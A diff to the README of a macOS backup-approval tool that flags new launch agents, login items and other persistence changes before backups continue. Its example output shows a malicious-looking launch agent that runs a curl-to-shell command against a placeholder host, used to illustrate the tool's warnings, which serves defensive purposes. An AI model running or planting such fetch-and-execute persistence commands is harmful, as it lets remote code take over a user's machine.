@@ -14,15 +14,22 @@ change and approve it, or investigate it. Either way, your older backups stay cl
 It's a single bash script with a LaunchDaemon. It has no dependencies and doesn't use the network.
 
 ```
-$ backup-gate status
-Last successful backup: 2026-11-12 09:56
-Recent log:
-  2026-11-12 13:58:02 starting backup to 4F1A9C2E-…
-  2026-11-12 13:58:41 backup finished (2026-11-12-135804)
-  2026-11-12 17:30:52 BLOCKED: 2 line(s) changed since the last approval
-Pending changes (< removed, > added):
-> btm	501	app|com.example.agent|…
-> launch	/Users/you/Library/LaunchAgents/com.example.agent.plist	you:staff:644	9f2c…
+$ sudo /usr/local/sbin/backup-gate approve
+3 change(s) since the last approval (2026-11-10 13:48):
+
++ ADDED   Launch agent (user you): com.example.updater
+           file     /Users/you/Library/LaunchAgents/com.example.updater.plist  (you staff 644)
+           runs     /bin/bash -c 'curl -s https://example.invalid/u | sh'
+           signer   Apple
+           ! starts bash: what it does depends on the arguments above
++ ADDED   Login item (you): com.clipy-app.Clipy
+           item     /Applications/Clipy.app
+           signer   Developer ID Application: Shunsuke Furubayashi (BBCHAJ584H)
+- REMOVED Background daemon (runs as root): us.zoom.updater.install
+
+Approve only if every change is something you (or an update you ran) did.
+
+Type APPROVE to accept, RAW for the raw diff, or press Return to cancel:
 ```
 
 ## How it works
@@ -116,9 +123,23 @@ and you approve the new gate files.
 | `cat /var/log/backup-gate.log` | full history |
 
 **After installing or updating something** (an app, a Homebrew service, a macOS update, an edit
-to `.zshrc`...), expect a "N change(s) since the last approval" notification. Run `status`,
-check that every line is something you did, then `approve`. If you see a change you didn't
-make, don't approve it: find out what it is first.
+to `.zshrc`...), expect a "N change(s) since the last approval" notification. Run
+`sudo /usr/local/sbin/backup-gate approve`, check that every change is something you did, and
+type `APPROVE`. If you see a change you didn't make, press Return instead and find out what it
+is first.
+
+For each change, `approve` shows:
+
+- **what kind of item it is** in plain words (launch daemon running as root, login item, sudo
+  rule...) and whether it was added, removed or changed
+- **what it runs:** the full command line from the launchd plist
+- **who signed the program.** This is checked against Apple's certificate chain, not taken from
+  the certificate's name, so a self-signed "Apple" certificate shows up as `UNTRUSTED`
+- **warnings** for programs that are unsigned, missing, start a shell or script interpreter
+  (`bash -c ...`, `osascript`, `curl`), or run from a temporary, shared or hidden folder
+
+Typing `RAW` shows the underlying diff. Text from the inventory is stripped of terminal control
+characters before it's shown, so a crafted file name can't hide or fake a line.
 
 The notification is sent with `osascript`, so macOS shows it as coming from Script Editor.
 Allow its notifications in System Settings › Notifications.
